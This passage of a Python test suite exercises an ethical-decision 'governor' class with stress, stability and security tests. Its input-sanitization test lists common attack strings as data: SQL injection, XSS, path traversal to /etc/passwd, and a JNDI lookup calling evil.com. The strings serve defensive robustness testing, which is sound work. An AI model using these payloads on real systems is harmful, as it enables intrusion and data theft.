            assert isinstance(result, DecisionResult)
            
            # Periodically check memory usage doesn't grow unbounded
            if i % 10 == 0:
                import gc
                gc.collect()
        
        # Should handle all requests without crashing
        assert len(governor.decision_history) == 50
    
    def test_long_running_stability(self):
        """Test long-running stability"""
        governor = GenesisEthicalGovernor()
        
        # Simulate long-running usage
        for iteration in range(1000):
            context = EthicalContext(
                user_id=f"long_run_user_{iteration % 100}",
                action=f"long_run_action_{iteration}",
                context_data={"iteration": iteration},
                timestamp=datetime.now()
            )
            
            decision = EthicalDecision(
                action=f"long_run_action_{iteration}",
                context=context,
                parameters={"iteration": iteration}
            )
            
            result = governor.evaluate_decision(decision)
            assert isinstance(result, DecisionResult)
            
            # Periodically add/remove rules to simulate dynamic behavior
            if iteration % 100 == 0:
                rule = {
                    "name": f"dynamic_rule_{iteration}",
                    "condition": lambda ctx: ctx.action.startswith("long_run"),
                    "action": "allow",
                    "priority": 1
                }
                governor.add_ethical_rule(rule)
            
            if iteration % 150 == 0 and iteration > 0:
                try:
                    governor.remove_ethical_rule(f"dynamic_rule_{iteration - 100}")
                except ValueError:
                    pass  # Rule might not exist
        
        # Should complete without issues
        assert len(governor.decision_history) == 1000


class TestGenesisEthicalGovernorSecurityTests:
    """Security-focused tests for GenesisEthicalGovernor"""
    
    def test_privilege_escalation_prevention(self):
        """Test prevention of privilege escalation attempts"""
        governor = GenesisEthicalGovernor()
        
        # Simulate privilege escalation attempt
        escalation_context = EthicalContext(
            user_id="normal_user",
            action="admin_action",
            context_data={
                "attempted_role": "admin",
                "original_role": "user",
                "escalation_vector": "parameter_manipulation"
            },
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="admin_action",
            context=escalation_context,
            parameters={"force_admin": True, "bypass_checks": True}
        )
        
        result = governor.evaluate_decision(decision)
        
        # Should detect and prevent escalation
        assert result.approved is False
        assert result.confidence_score > 0.8
    
    def test_data_exfiltration_detection(self):
        """Test detection of data exfiltration attempts"""
        governor = GenesisEthicalGovernor()
        
        exfiltration_context = EthicalContext(
            user_id="suspicious_user",
            action="bulk_data_export",
            context_data={
                "export_volume": "massive",
                "export_target": "external_server",
                "time_pattern": "off_hours"
            },
            timestamp=datetime.now()
        )
        
        decision = EthicalDecision(
            action="bulk_data_export",
            context=exfiltration_context,
            parameters={
                "export_all": True,
                "include_sensitive": True,
                "compression": "maximum"
            }
        )
        
        result = governor.evaluate_decision(decision)
        
        # Should detect potential exfiltration
        assert result.approved is False
        assert result.confidence_score > 0.7
    
    def test_timing_attack_resistance(self):
        """Test resistance to timing attacks"""
        governor = GenesisEthicalGovernor()
        
        # Make decisions with different complexities
        simple_context = EthicalContext(
            user_id="timing_user",
            action="simple_action",
            context_data={"complexity": "low"},
            timestamp=datetime.now()
        )
        
        complex_context = EthicalContext(
            user_id="timing_user",
            action="complex_action",
            context_data={"complexity": "high", "nested": {"deep": {"data": "value"}}},
            timestamp=datetime.now()
        )
        
        import time
        
        # Time simple decision
        start_time = time.time()
        simple_decision = EthicalDecision(
            action="simple_action",
            context=simple_context,
            parameters={}
        )
        governor.evaluate_decision(simple_decision)
        simple_time = time.time() - start_time
        
        # Time complex decision
        start_time = time.time()
        complex_decision = EthicalDecision(
            action="complex_action",
            context=complex_context,
            parameters={}
        )
        governor.evaluate_decision(complex_decision)
        complex_time = time.time() - start_time
        
        # Timing should not reveal internal logic
        # (This is a basic check - more sophisticated timing analysis would be needed)
        assert abs(simple_time - complex_time) < 0.1  # Should be within 100ms
    
    def test_input_sanitization(self):
        """Test input sanitization for various attack vectors"""
        governor = GenesisEthicalGovernor()
        
        attack_vectors = [
            "'; DROP TABLE users; --",
            "<script>alert('xss')</script>",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}",
            "{{7*7}}",
            "javascript:alert('xss')",
            "data:text/html,<script>alert('xss')</script>",
            "\x00\x01\x02\x03\x04\x05",
            "A" * 10000,
            "🚀" * 1000
        ]
        
        for i, vector in enumerate(attack_vectors):
            context = EthicalContext(
                user_id=f"attack_user_{i}",
                action=vector,
                context_data={"payload": vector},
                timestamp=datetime.now()
            )
            
            decision = EthicalDecision(
                action=vector,
                context=context,
                parameters={"attack_vector": vector}
            )
            
            # Should handle all attack vectors without crashing
            result = governor.evaluate_decision(decision)
            assert isinstance(result, DecisionResult)